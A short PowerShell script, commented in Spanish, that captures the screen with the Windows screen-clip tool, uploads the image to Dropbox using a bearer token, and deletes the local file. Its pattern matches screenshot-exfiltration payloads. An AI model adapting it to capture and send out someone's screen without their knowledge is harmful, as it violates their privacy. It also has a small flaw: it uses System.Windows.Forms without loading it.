# Define el token de acceso de Dropbox
$db = ""

# Función para subir archivos a Dropbox
function DropBox-Upload {
    [CmdletBinding()]
    param (
        [Parameter (Mandatory = $True, ValueFromPipeline = $True)]
        [Alias("f")]
        [string]$SourceFilePath
    )
    $outputFile = Split-Path $SourceFilePath -leaf
    $TargetFilePath = "/$outputFile"
    $arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
    $authorization = "Bearer " + $db
    $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
    $headers.Add("Authorization", $authorization)
    $headers.Add("Dropbox-API-Arg", $arg)
    $headers.Add("Content-Type", 'application/octet-stream')

    # Subir el archivo a Dropbox
    Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
}

# Función para capturar la pantalla utilizando la herramienta de captura de pantalla de Windows
function Capture-Screen {
    $filePath = "$env:TEMP\sc.png"
    # Usa la herramienta de captura de pantalla integrada en Windows (Snipping Tool)
    Start-Process "ms-screenclip:" -ArgumentList "/clip"
    Start-Sleep -Seconds 5
    Add-Type -AssemblyName System.Drawing
    $clipboard = [System.Windows.Forms.Clipboard]::GetImage()
    $clipboard.Save($filePath, [System.Drawing.Imaging.ImageFormat]::Png)
    return $filePath
}

try {
    # Capturar la pantalla y obtener la ruta del archivo
    $screenshotPath = Capture-Screen

    # Subir la captura de pantalla a Dropbox
    if (-not ([string]::IsNullOrEmpty($db))) {
        DropBox-Upload -f $screenshotPath
    } else {
        Write-Error "No se proporcionó el token de acceso de Dropbox."
    }

    # Limpiar el archivo de captura de pantalla
    Remove-Item -Path $screenshotPath -Force
}
catch {
    Write-Error "Ocurrió un error: $_"
}
